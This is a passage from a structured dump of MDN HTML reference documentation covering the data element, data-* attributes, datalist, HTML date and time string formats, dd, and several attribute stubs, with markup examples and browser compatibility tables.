[phrasing content](../content_categories#phrasing_content), palpable content. |\n| Permitted content                           | [Phrasing content](../content_categories#phrasing_content).                                                                       |\n| Tag omission                                | None, both the starting and ending tag are mandatory.                                                                             |\n| Permitted parents                           | Any element that accepts [phrasing content](../content_categories#phrasing_content).                                              |\n| Implicit ARIA role                          | [`generic`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/generic_role)                                   |\n| Permitted ARIA roles                        | Any                                                                                                                               |\n| DOM interface                               | [`HTMLDataElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLDataElement)                                             |\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n|         | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|---------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|         | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `data`  | 62      | 14   | 22      | 49    | 10     | 62             | 22                  | 46            | 10            | 8.0              | 62              |     |\n| `value` | 62      | 14   | 22      | 49    | 10     | 62             | 22                  | 46            | 10            | 8.0              | 62              |     |\n\n## See also\n\n- The HTML [`<time>`](time) element.\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Element/data](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/data)"
- name: data (attribute)
  summary: ''
  belongs_to: Attributes
  description: |-
    [`data`](element/object#data)

    [`<object>`](element/object)

    Specifies the URL of the resource.
- name: data-* (attribute)
  summary: The data-* global attributes form a class of attributes called custom data attributes, that allow proprietary information to be exchanged between the HTML and its DOM representation by scripts
  description: "# data-\\*\n\nThe `data-*` [global attributes](../global_attributes) form a class of attributes called **custom data attributes**, that allow proprietary information to be exchanged between the [HTML](../index) and its [DOM](https://developer.mozilla.org/en-US/docs/Web/API/Document_Object_Model) representation by scripts.\n\n## Try it\n\n#### HTML Demo: data-\\*\n\nReset\n\nThe interactive example cannot be shown because JavaScript is disabled.\n\nThe interactive example cannot be shown because MathML is not supported by your browser.\n\nHTML\n\nCSS\n\nJavaScript\n\n    <h1>Secret agents</h1>\n\n    <ul>\n      <li data-id=\"10784\">Jason Walters, 003: Found dead in \"A View to a Kill\".</li>\n      <li data-id=\"97865\">Alex Trevelyan, 006: Agent turned terrorist leader; James' nemesis in \"Goldeneye\".</li>\n      <li data-id=\"45732\">James Bond, 007: The main man; shaken but not stirred.</li>\n    </ul>\n\n    h1 {\n      margin: 0;\n    }\n\n    ul {\n      margin: 10px 0 0;\n    }\n\n    li {\n      position: relative;\n      width: 200px;\n      padding-bottom: 10px;\n    }\n\n    li:after {\n      content: 'Data ID: ' attr(data-id);\n      position: absolute;\n      top: -22px;\n      left: 10px;\n      background: black;\n      color: white;\n      padding: 2px;\n      border: 1px solid #eee;\n      opacity: 0;\n      transition: 0.5s opacity;\n    }\n\n    li:hover:after {\n      opacity: 1;\n    }\n\n#### Output\n\n#### Console Output\n\nclear console\n\n%html-content%\n\nAll such custom data are available via the [`HTMLElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLElement) interface of the element the attribute is set on. The [`HTMLElement.dataset`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLElement/dataset) property gives access to them. The `*` may be replaced by any name following [the production rule of XML names](https://www.w3.org/TR/REC-xml/#NT-Name) which includes the following recommendations:\n\n- The name should not start with `xml` (case-insensitive), as it's reserved for future XML specifications.\n- The name should not contain any colon characters (`:`), as XML assigns meaning to such names.\n- The name should not contain any capital letters, as XML is all lowercase.\n\nThese are recommendations. If these naming recommendations are not followed, no errors will occur. The attributes will still be matched using CSS [attribute selectors](https://developer.mozilla.org/en-US/docs/Web/CSS/Attribute_selectors), with the attribute being case insensitive and any attribute value being case-sensitive. Attributes not conforming to these three recommendations will also still be recognized by the JavaScript [`HTMLElement.dataset`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLElement/dataset) property and user-agents will include the attribute in the [`DOMStringMap`](https://developer.mozilla.org/en-US/docs/Web/API/DOMStringMap) containing all the custom data attributes for an [`HTMLElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLElement).\n\nIf you plan to use [`HTMLElement.dataset`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLElement/dataset), the portion of the attribute name following the `data-` can only include characters allowed in JavaScript property names (and hyphens, which will be removed). The `dataset` version of the attribute name removes the \"data-\" prefix and converts the rest of the name from [kebab-case](https://developer.mozilla.org/en-US/docs/Glossary/Kebab_case) to camelCase. For example, `element.getAttribute(\"data-test\")` is equivalent to `element.dataset.test` and `data-test-abc` will be accessible as `HTMLElement.dataset.testAbc` (or by `HTMLElement.dataset[\"testAbc\"]`). Avoid non-alphabetic characters following a hyphen, such as `data-test-1` or `data--test`, as they will not be recognized by [`HTMLElement.dataset`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLElement/dataset).\n\n### Usage\n\nBy adding `data-*` attributes, even ordinary HTML elements can become rather complex and powerful program-objects. For example, a space-ship \"[sprite](https://en.wikipedia.org/wiki/Sprite_(computer_graphics))*\"* in a game could be a simple [`<img>`](../element/img) element with a [`class`](class) attribute and several `data-*` attributes:\n\nhtml\n\n```\n<img\n  class=\"spaceship cruiserX3\"\n  src=\"shipX3.png\"\n  data-ship-id=\"324\"\n  data-weapons=\"laserI laserII\"\n  data-shields=\"72%\"\n  data-x=\"414354\"\n  data-y=\"85160\"\n  data-z=\"31940\"\n  onclick=\"spaceships[this.dataset.shipId].blasted()\" />\n```\n\nFor a more in-depth tutorial about using HTML data attributes, see [Using data attributes](https://developer.mozilla.org/en-US/docs/Learn/HTML/Howto/Use_data_attributes).\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n|          | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|----------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|          | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `data-*` | 7       | 12   | 6       | 15    | 5.1    | 18             | 6                   | 14            | 5             | 1.0              | 4.4             |     |\n\n## See also\n\n- All [global attributes](../global_attributes).\n- The [`HTMLElement.dataset`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLElement/dataset) property that allows to access and modify these values.\n- [Using data attributes](https://developer.mozilla.org/en-US/docs/Learn/HTML/Howto/Use_data_attributes)\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Global_attributes/data-\\*](https://developer.mozilla.org/en-US/docs/Web/HTML/Global_attributes/data-*)"
- name: datalist
  summary: This feature is not Baseline because it does not work in some of the most widely-used browsers
  description: "# \\<datalist\\>: The HTML Data List element\n\n## Limited availability\n\nThis feature is not Baseline because it does not work in some of the most widely-used browsers.\n\n- [Learn more](https://developer.mozilla.org/en-US/docs/Glossary/Baseline/Compatibility)\n- [See full compatibility](#browser_compatibility)\n- [Report feedback](https://survey.alchemer.com/s3/7634825/MDN-baseline-feedback?page=%2Fen-US%2Fdocs%2FWeb%2FHTML%2FElement%2Fdatalist&level=not)\n\nThe `<datalist>` [HTML](../index) element contains a set of [`<option>`](option) elements that represent the permissible or recommended options available to choose from within other controls.\n\n## Try it\n\n#### HTML Demo: \\<datalist\\>\n\nReset\n\nThe interactive example cannot be shown because JavaScript is disabled.\n\nThe interactive example cannot be shown because MathML is not supported by your browser.\n\nHTML\n\nCSS\n\nJavaScript\n\n    <label for=\"ice-cream-choice\">Choose a flavor:</label>\n    <input list=\"ice-cream-flavors\" id=\"ice-cream-choice\" name=\"ice-cream-choice\" />\n\n    <datalist id=\"ice-cream-flavors\">\n      <option value=\"Chocolate\"></option>\n      <option value=\"Coconut\"></option>\n      <option value=\"Mint\"></option>\n      <option value=\"Strawberry\"></option>\n      <option value=\"Vanilla\"></option>\n    </datalist>\n\n    label {\n      display: block;\n      margin-bottom: 10px;\n    }\n\n#### Output\n\n#### Console Output\n\nclear console\n\n%html-content%\n\nTo bind the `<datalist>` element to the control, we give it a unique identifier in the [`id`](../global_attributes/id) attribute, and then add the [`list`](input#list) attribute to the [`<input>`](input) element with the same identifier as value. Only certain types of [`<input>`](input) support this behavior, and it can also vary from browser to browser.\n\nEach `<option>` element should have a `value` attribute, which represents a suggestion to be entered into the input. It can also have a `label` attribute, or, missing that, some text content, which may be displayed by the browser instead of `value` (Firefox), or in addition to `value` (Chrome and Safari, as supplemental text). The exact content of the drop-down menu depends on the browser, but when clicked, content entered into control field will always come from the `value` attribute.\n\n**Note:** `<datalist>` is not a replacement for [`<select>`](select). A `<datalist>` does not represent an input itself; it is a list of suggested values for an associated control. The control can still accept any value that passes vaildation, even if it is not in this suggestion list.\n\n## Attributes\n\nThis element has no other attributes than the [global attributes](../global_attributes), common to all elements.\n\n## Accessibility\n\nWhen deciding to use the `<datalist>` element, here are some accessibility issues to be mindful of:\n\n- The font size of the data list's options does not zoom, always remaining the same size. The contents of the autosuggest do not grow or shrink when the rest of the contents are zoomed in or out.\n- As targeting the list of options with CSS is very limited to non-existent, rendering can not be styled for high-contrast mode.\n- Some screen reader/browser combinations, including NVDA and Firefox, do not announce the contents of the autosuggest popup.\n\n## Examples\n\n### Textual types\n\nRecommended values in types [text](input/text), [search](input/search), [url](input/url), [tel](input/tel), [email](input/email) and [number](input/number), are displayed in a drop-down menu when user clicks or double-clicks on the control. Typically the right side of a control will also have an arrow pointing to the presence of predefined values.\n\nhtml\n\n```\n<label for=\"myBrowser\">Choose a browser from this list:</label>\n<input list=\"browsers\" id=\"myBrowser\" name=\"myBrowser\" />\n<datalist id=\"browsers\">\n  <option value=\"Chrome\"></option>\n  <option value=\"Firefox\"></option>\n  <option value=\"Opera\"></option>\n  <option value=\"Safari\"></option>\n  <option value=\"Microsoft Edge\"></option>\n</datalist>\n```\n\n### Date and Time types\n\nThe types [month](input/month), [week](input/week), [date](input/date), [time](input/time) and [datetime-local](input/datetime-local) can show an interface that allows a convenient selection of a date and time. Predefined values can be shown there, allowing the user to quickly fill the control value.\n\n**Note:** When type is not supported, `text` type creating simple text field will be used instead. That field will correctly recognize recommended values and display them to the user in a drop-down menu.\n\nhtml\n\n```\n<input type=\"time\" list=\"popularHours\" />\n<datalist id=\"popularHours\">\n  <option value=\"12:00\"></option>\n  <option value=\"13:00\"></option>\n  <option value=\"14:00\"></option>\n</datalist>\n```\n\n### Range type\n\nThe recommended values in the [range](input/range) type will be shown as series of hash marks that the user can easily select.\n\nhtml\n\n```\n<label for=\"tick\">Tip amount:</label>\n<input type=\"range\" list=\"tickmarks\" min=\"0\" max=\"100\" id=\"tick\" name=\"tick\" />\n<datalist id=\"tickmarks\">\n  <option value=\"0\"></option>\n  <option value=\"10\"></option>\n  <option value=\"20\"></option>\n  <option value=\"30\"></option>\n</datalist>\n```\n\n### Color type\n\nThe [color](input/color) type can show predefined colors in a browser-provided interface.\n\nhtml\n\n```\n<label for=\"colors\">Pick a color (preferably a red tone):</label>\n<input type=\"color\" list=\"redColors\" id=\"colors\" />\n<datalist id=\"redColors\">\n  <option value=\"#800000\"></option>\n  <option value=\"#8B0000\"></option>\n  <option value=\"#A52A2A\"></option>\n  <option value=\"#DC143C\"></option>\n</datalist>\n```\n\n### Password type\n\nThe specification allows linking `<datalist>` with a [password](input/password) type, but no browser supports it for security reasons.\n\nhtml\n\n```\n<label for=\"pwd\">Enter a password:</label>\n<input type=\"password\" list=\"randomPassword\" id=\"pwd\" />\n<datalist id=\"randomPassword\">\n  <option value=\"5Mg[_3DnkgSu@!q#\"></option>\n</datalist>\n```\n\n## Technical summary\n\n|                                             |                                                                                                                  |\n|---------------------------------------------|------------------------------------------------------------------------------------------------------------------|\n| [Content categories](../content_categories) | [Flow content](../content_categories#flow_content), [phrasing content](../content_categories#phrasing_content).  |\n| Permitted content                           | Either [phrasing content](../content_categories#phrasing_content) or zero or more [`<option>`](option) elements. |\n| Tag omission                                | None, both the starting and ending tag are mandatory.                                                            |\n| Permitted parents                           | Any element that accepts [phrasing content](../content_categories#phrasing_content).                             |\n| Implicit ARIA role                          | [listbox](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/listbox_role)                    |\n| Permitted ARIA roles                        | No `role` permitted                                                                                              |\n| DOM interface                               | [`HTMLDataListElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLDataListElement)                    |\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n[TABLE]\n\n## See also\n\n- The [`<input>`](input) element, and more specifically its [`list`](input#list) attribute;\n- The [`<option>`](option) element.\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Element/datalist](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/datalist)"
- name: Date and time formats
  summary: Certain HTML elements use date and/or time values
  description: "# Date and time formats used in HTML\n\nCertain HTML elements use date and/or time values. The formats of the strings that specify these values are described in this article.\n\nElements that use such formats include certain forms of the [`<input>`](element/input) element that let the user choose or specify a date, time, or both, as well as the [`<ins>`](element/ins) and [`<del>`](element/del) elements, whose [`datetime`](element/ins#datetime) attribute specifies the date or date and time at which the insertion or deletion of content occurred.\n\nFor `<input>`, the [`type`](element/input#type) values of inputs whose [`value`](element/input#value) contains a string representing a date and/or time are:\n\n- [`date`](element/input/date)\n- [`datetime-local`](element/input/datetime-local)\n- [`month`](element/input/month)\n- [`time`](element/input/time)\n- [`week`](element/input/week)\n\n## Examples\n\nBefore getting into the intricacies of how date and time strings are written and parsed in HTML, here are some examples that should give you a good idea what the more commonly-used date and time string formats look like.\n\n| String                      | Date and/or time                                                      |                                              |\n|-----------------------------|-----------------------------------------------------------------------|----------------------------------------------|\n| `2005-06-07`                | June 7, 2005                                                          | [\\[details\\]](#date_strings)                 |\n| `08:45`                     | 8:45 AM                                                               | [\\[details\\]](#time_strings)                 |\n| `08:45:25`                  | 8:45 AM and 25 seconds                                                | [\\[details\\]](#time_strings)                 |\n| `0033-08-04T03:40`          | 3:40 AM on August 4, 33                                               | [\\[details\\]](#local_date_and_time_strings)  |\n| `1977-04-01T14:00:30`       | 30 seconds after 2:00 PM on April 1, 1977                             | [\\[details\\]](#local_date_and_time_strings)  |\n| `1901-01-01T00:00Z`         | Midnight UTC on January 1, 1901                                       | [\\[details\\]](#global_date_and_time_strings) |\n| `1901-01-01T00:00:01-04:00` | 1 second past midnight Eastern Standard Time (EST) on January 1, 1901 | [\\[details\\]](#global_date_and_time_strings) |\n\nExample HTML date and time strings\n\n## Basics\n\nBefore looking at the various formats of date and time related strings used by HTML elements, it is helpful to understand a few fundamental facts about the way they're defined. HTML uses a variation of the [ISO 8601](https://en.wikipedia.org/wiki/ISO_8601) standard for its date and time strings. It's worth reviewing the descriptions of the formats you're using in order to ensure that your strings are in fact compatible with HTML, as the HTML specification includes algorithms for parsing these strings that is actually more precise than ISO 8601, so there can be subtle differences in how date and time strings are expected to look.\n\n### Character set\n\nDates and times in HTML are always strings which use the [ASCII](https://developer.mozilla.org/en-US/docs/Glossary/ASCII) character set.\n\n### Year numbers\n\nIn order to simplify the basic format used for date strings in HTML, the specification requires that all years be given using the modern (or **proleptic**) [Gregorian calendar](https://en.wikipedia.org/wiki/Gregorian_calendar). While user interfaces may allow entry of dates using other calendars, the underlying value always uses the Gregorian calendar.\n\nWhile the Gregorian calendar wasn't created until the year 1582 (replacing the similar Julian calendar), for HTML's purposes, the Gregorian calendar is extended back to the year 1 C.E. Make sure any older dates account for this.\n\nFor the purposes of HTML dates, years are always at least four digits long; years prior to the year 1000 are padded with leading zeroes (\"`0`\"), so the year 72 is written as `0072`. Years prior to the year 1 C.E. are not supported, so HTML doesn't support years 1 B.C.E. (1 B.C.) or earlier.\n\nA year is normally 365 days long, except during **[leap years](#leap_years)**.\n\n#### Leap years\n\nA **leap year** is any year which is divisible by 400 *or* the year is divisible by 4 but not by 100. Although the calendar year is normally 365 days long, it actually takes the planet Earth approximately 365.2422 days to complete a single orbit around the sun. Leap years help to adjust the calendar to keep it synchronized with the actual position of the planet in its orbit. Adding a day to the year every four years essentially makes the average year 365.25 days long, which is close to correct.\n\nThe adjustments to the algorithm (taking a leap year when the year can be divided by 400, and skipping leap years when the year is divisible by 100) help to bring the average even closer to the correct number of days (365.2425 days). Scientists occasionally add leap seconds to the calendar (seriously) to handle the remaining three ten-thousandths of a day and to compensate for the gradual, naturally occurring slowing of Earth's rotation.\n\nWhile month `02`, February, normally has 28 days, it has 29 days in leap years.\n\n### Months of the year\n\nThere are 12 months in the year, numbered 1 through 12. They are always represented by a two-digit ASCII string whose value ranges from `01` through `12`. See the table in the section [Days of the month](#days_of_the_month) for the month numbers and their corresponding names (and lengths in days).\n\n### Days of the month\n\nMonth numbers 1, 3, 5, 7, 8, 10, and 12 are 31 days long. Months 4, 6, 9, and 11 are 30 days long. Month 2, February, is 28 days long most years, but is 29 days long in leap years. This is detailed in the following table.\n\n| Month number | Name (English) | Length in days        |\n|--------------|----------------|-----------------------|\n| 01           | January        | 31                    |\n| 02           | February       | 28 (29 in leap years) |\n| 03           | March          | 31                    |\n| 04           | April          | 30                    |\n| 05           | May            | 31                    |\n| 06           | June           | 30                    |\n| 07           | July           | 31                    |\n| 08           | August         | 31                    |\n| 09           | September      | 30                    |\n| 10           | October        | 31                    |\n| 11           | November       | 30                    |\n| 12           | December       | 31                    |\n\nThe months of the year and their lengths in days\n\n## Week strings\n\nA week string specifies a week within a particular year. A **valid week string** consists of a valid [year number](#year_numbers), followed by a hyphen character (\"`-`\", or U+002D), then the capital letter \"`W`\" (U+0057), followed by a two-digit week of the year value.\n\nThe week of the year is a two-digit string between `01` and `53`. Each week begins on Monday and ends on Sunday. That means it's possible for the first few days of January to be considered part of the previous week-year, and for the last few days of December to be considered part of the following week-year. The first week of the year is the week that contains the *first Thursday of the year*. For example, the first Thursday of 1953 was on January 1, so that week—beginning on Monday, December 29—is considered the first week of the year. Therefore, December 30, 1952 occurs during the week `1953-W01`.\n\nA year has 53 weeks if:\n\n- The first day of the calendar year (January 1) is a Thursday **or**\n- The first day of the year (January 1) is a Wednesday and the year is a [leap year](#leap_years)\n\nAll other years have 52 weeks.\n\n| Week string | Week and year (Date range)                        |\n|-------------|---------------------------------------------------|\n| `2001-W37`  | Week 37, 2001 (September 10-16, 2001)             |\n| `1953-W01`  | Week 1, 1953 (December 29, 1952-January 4, 1953)  |\n| `1948-W53`  | Week 53, 1948 (December 27, 1948-January 2, 1949) |\n| `1949-W01`  | Week 1, 1949 (January 3-9, 1949)                  |\n| `0531-W16`  | Week 16, 531 (April 13-19, 531)                   |\n| `0042-W04`  | Week 4, 42 (January 21-27, 42)                    |\n\nNote that both the year and week numbers are padded with leading zeroes, with the year padded to four digits and the week to two.\n\n## Month strings\n\nA month string represents a specific month in time, rather than a generic month of the year. That is, rather than representing \"January,\" an HTML month string represents a month and year paired, like \"January 1972.\"\n\nA **valid month string** consists of a valid [year number](#year_numbers) (a string of at least four digits), followed by a hyphen character (\"`-`\", or U+002D), followed by a two-digit numeric [month number](#months_of_the_year), where `01` represents January and `12` represents December.\n\n| Month string | Month and year   |\n|--------------|------------------|\n| `17310-09`   | September, 17310 |\n| `2019-01`    | January, 2019    |\n| `1993-11`    | November, 1993   |\n| `0571-04`    | April, 571       |\n| `0001-07`    | July, 1 C.E.     |\n\nNotice that all years are at least four characters long; years that are fewer than four digits long are padded with leading zeroes.\n\n## Date strings\n\nA valid date string consists of a [month string](#month_strings), followed by a hyphen character (\"`-`\", or U+002D), followed by a two-digit [day of the month](#days_of_the_month).\n\n| Date string  | Full date        |\n|--------------|------------------|\n| `1993-11-01` | November 1, 1993 |\n| `1066-10-14` | October 14, 1066 |\n| `0571-04-22` | April 22, 571    |\n| `0062-02-05` | February 5, 62   |\n\n## Time strings\n\nA time string can specify a time with precision to the minute, second, or to the millisecond. Specifying only the hour or minute isn't permitted. A **valid time string** minimally consists of a two-digit hour followed by a colon (\"`:`\", U+003A), then a two-digit minute. The minute may optionally be followed by another colon and a two-digit number of seconds. Milliseconds may be specified, optionally, by adding a decimal point character (\"`.`\", U+002E) followed by one, two, or three digits.\n\nThere are some additional basic rules:\n\n- The hour is always specified using the 24-hour clock, with `00` being midnight and 11 PM being `23`. No values outside the range `00` – `23` are permitted.\n- The minute must be a two-digit number between `00` and `59`. No values outside that range are allowed.\n- If the number of seconds is omitted (to specify a time accurate only to the minute), no colon should follow the number of minutes.\n- If specified, the integer portion of the number of seconds must be between `00` and `59`. You *cannot* specify leap seconds by using values like `60` or `61`.\n- If the number of seconds is specified and is an integer, it must not be followed by a decimal point.\n- If a fraction of a second is included, it may be from one to three digits long, indicating the number of milliseconds. It follows the decimal point placed after the seconds component of the time string.\n\n| Time string   | Time                                          |\n|---------------|-----------------------------------------------|\n| `00:00:30.75` | 12:00:30.75 AM (30.75 seconds after midnight) |\n| `12:15`       | 12:15 PM                                      |\n| `13:44:25`    | 1:44:25 PM (25 seconds after 1:44 PM)         |\n\n## Local date and time strings\n\nA valid [`datetime-local`](element/input/datetime-local) string consists of a `date` string and a `time` string concatenated together with either the letter \"`T`\" or a space character separating them. No information about the time zone is included in the string; the date and time is presumed to be in the user's local time zone.\n\nWhen you set the [`value`](element/input#value) of a `datetime-local` input, the string is **normalized** into a standard form. Normalized `datetime` strings always use the letter \"`T`\" to separate the date and the time, and the time portion of the string is as short as possible. This is done by leaving out the seconds component if its value is `:00`.\n\n[TABLE]\n\nExamples of valid `datetime-local` strings\n\n## Global date and time strings\n\nA global date and time string specifies a date and time as well as the time zone in which it occurs. A **valid global date and time string** is the same format as a [local date and time string](#local_date_and_time_strings), except it has a time zone string appended to the end, following the time.\n\n### Time zone offset string\n\nA time zone offset string specifies the offset in either a positive or a negative number of hours and minutes from the standard time base. There are two standard time bases, which are very close to the same, but not exactly the same:\n\n- For dates after the establishment of [Coordinated Universal Time](https://en.wikipedia.org/wiki/Coordinated_Universal_Time) (UTC) in the early 1960s, the time base is `Z` and the offset indicates a particular time zone's offset from the time at the prime meridian at 0º longitude (which passes through the Royal Observatory at Greenwich, England).\n- For dates prior to UTC, the time base is instead expressed in terms of [UT1](https://en.wikipedia.org/wiki/UT1), which is the contemporary Earth solar time at the prime meridian.\n\nThe time zone string is appended immediately following the time in the date and time string. You can specify \"`Z`\" as the time zone offset string to indicate that the time is specified in UTC. Otherwise, the time zone string is constructed as follows:\n\n1.  A character indicating the sign of the offset: the plus character (\"`+`\", or U+002B) for time zones to the east of the prime meridian or the minus character (\"`-`\", or U+002D) for time zones to the west of the prime meridian.\n2.  A two-digit number of hours that the time zone is offset from the prime meridian. This value must be between `00` and `23`.\n3.  An optional colon (\"`:`\") character.\n4.  A two-digit number of minutes past the hour; this value must be between `00` and `59`.\n\nWhile this format allows for time zones between -23:59 and +23:59, the current range of time zone offsets is -12:00 to +14:00, and no time zones are currently offset from the hour by anything other than `00`, `30`, or `45` minutes. This may change at more or less anytime, since countries are free to tamper with their time zones at any time and in any way they wish to do so.\n\n| Global date and time string   | Actual global date and time                                                      | Date and time at prime meridian                     |\n|-------------------------------|----------------------------------------------------------------------------------|-----------------------------------------------------|\n| `2005-06-07T00:00Z`           | June 7, 2005 at midnight UTC                                                     | June 7, 2005 at midnight                            |\n| `1789-08-22T12:30:00.1-04:00` | August 22, 1789 at a tenth of a second past 12:30 PM Eastern Daylight Time (EDT) | August 22, 1789 at a tenth of a second past 4:30 PM |\n| `3755-01-01 00:00+10:00`      | January 1, 3755 at midnight Australian Eastern Standard Time (AEST)              | December 31, 3754 at 2:00 PM                        |\n\nExamples of valid global date and time strings\n\n## Date issues\n\nBecause of data storage and precision issues, you may want to be aware of a few client-side and server-side issues.\n\n### The Y2K38 Problem (often server-side)\n\nJavaScript uses double precision floating points to store dates, as with all numbers, meaning that JavaScript code will not suffer from the Y2K38 problem unless integer coercion/bit-hacks are used because all JavaScript bit operators use 32-bit signed 2s-complement integers.\n\nThe problem is with the server side of things: storage of dates greater than 2^31 - 1. To fix this problem, you must store all dates using either unsigned 32-bit integers, signed 64-bit integers, or double-precision floating points on the server. If your server is written in PHP, the fix may be as simple as upgrading to PHP 8 or 7, and upgrading your hardware to x86_64 or IA64. If you are stuck with other hardware, you can try to emulate 64-bit hardware inside a 32-bit virtual machine, but most VMs don't support this kind of virtualization, since stability may suffer, and performance will definitely suffer greatly.\n\n### The Y10k Problem (often client-side)\n\nIn many servers, dates are stored as numbers instead of as strings--numbers of a fixed size and agnostic of format (aside from endianness). After the year 10,000, those numbers will just be a bit bigger than before, so many servers will not see issues with forms submitted after the year 10,000.\n\nThe problem is with the client side of things: parsing of dates with more than 4 digits in the year.\n\nhtml\n\n```\n<!--midnight of January 1st, 10000: the exact time of Y10K-->\n<input type=\"datetime-local\" value=\"+010000-01-01T05:00\" />\n```\n\nIt's that simple. Just prepare your code for any number of digits. Do not only prepare for 5 digits. Here is JavaScript code for programmatically setting the value:\n\njs\n\n```\nfunction setValue(element, date) {\n  const isoString = date.toISOString();\n  element.value = isoString.substring(0, isoString.indexOf(\"T\") + 6);\n}\n```\n\nWhy worry about the Y10K problem if it is going to happen many centuries after your death? Exactly because you will already be dead, so the companies using your software will be stuck using your software without any other coder who knows the system well enough to come in and fix it.\n\n## See also\n\n- [`<input>`](element/input)\n- [`<ins>`](element/ins) and [`<del>`](element/del): see the `datetime` attribute, which specifies either a date or a local date and time at which the content was inserted or deleted\n- [The ISO 8601 specification](https://www.iso.org/iso-8601-date-and-time-format.html)\n- [Numbers and Dates](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Numbers_and_dates) in the [JavaScript Guide](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide)\n- The JavaScript [`Date`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Date) object\n- The [`Intl.DateTimeFormat`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Intl/DateTimeFormat) object for formatting dates and times for a given locale\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Date_and_time_formats](https://developer.mozilla.org/en-US/docs/Web/HTML/Date_and_time_formats)"
- name: datetime (attribute)
  summary: ''
  belongs_to: Attributes
  description: |-
    [`datetime`](https://developer.mozilla.org/en-US/docs/Web/HTML/Attributes/datetime)

    [`<del>`](element/del), [`<ins>`](element/ins), [`<time>`](element/time)

    Indicates the date and time associated with the element.
- name: dd
  summary: The <dd> HTML element provides the description, definition, or value for the preceding term (<dt>) in a description list (<dl>)
  description: "# \\<dd\\>: The Description Details element\n\nThe `<dd>` [HTML](../index) element provides the description, definition, or value for the preceding term ([`<dt>`](dt)) in a description list ([`<dl>`](dl)).\n\n## Try it\n\n#### HTML Demo: \\<dd\\>\n\nReset\n\nThe interactive example cannot be shown because JavaScript is disabled.\n\nThe interactive example cannot be shown because MathML is not supported by your browser.\n\nHTML\n\nCSS\n\nJavaScript\n\n    <p>Cryptids of Cornwall:</p>\n\n    <dl>\n      <dt>Beast of Bodmin</dt>\n      <dd>A large feline inhabiting Bodmin Moor.</dd>\n\n      <dt>Morgawr</dt>\n      <dd>A sea serpent.</dd>\n\n      <dt>Owlman</dt>\n      <dd>A giant owl-like creature.</dd>\n    </dl>\n\n    p,\n    dt {\n      font-weight: bold;\n    }\n\n    dl,\n    dd {\n      font-size: 0.9rem;\n    }\n\n    dd {\n      margin-bottom: 1em;\n    }\n\n#### Output\n\n#### Console Output\n\nclear console\n\n%html-content%\n\n## Attributes\n\nThis element only includes the [global attributes](../global_attributes).\n\n## Examples\n\nFor examples, see the [examples provided for the `<dl>` element](dl#examples).\n\n## Technical summary\n\n[TABLE]\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n[TABLE]\n\n## See also\n\n- [`<dl>`](dl)\n- [`<dt>`](dt)\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Element/dd](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/dd)"
- name: decoding (attribute)
  summary: ''
  belongs_to: Attributes
  description: |-
    [`decoding`](element/img#decoding)

    [`<img>`](element/img)

    Indicates the preferred method to decode the image.
- name: default (attribute)
  summary: ''
  belongs_to: Attributes
  description: |-
    [`default`](element/track#default)

    [`<track>`](element/track)

    Indicates that the track should be enabled unless the user's preferences indicate something different.
- name: defer (attribute)
  summary: ''
  belongs_to: Attributes
  description: |-
    [`defer`](element/script#defer)

    [`<script>`](element/script)

    Indicates that the script should be executed after the page has been parsed.
- name: del
  summary: This feature is well established and works across many devices and browser versions
